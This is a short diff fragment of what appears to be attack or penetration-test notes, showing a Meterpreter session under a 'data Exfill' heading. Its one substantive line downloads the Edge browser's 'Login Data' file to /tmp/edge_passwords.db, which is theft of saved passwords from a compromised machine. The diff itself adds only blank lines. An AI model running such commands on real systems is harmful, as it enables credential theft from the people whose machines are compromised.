@@ -26,3 +26,5 @@ meterpreter > ls
 
 data Exfill 
 meterpreter > download "Login Data" /tmp/edge_passwords.db
+
+
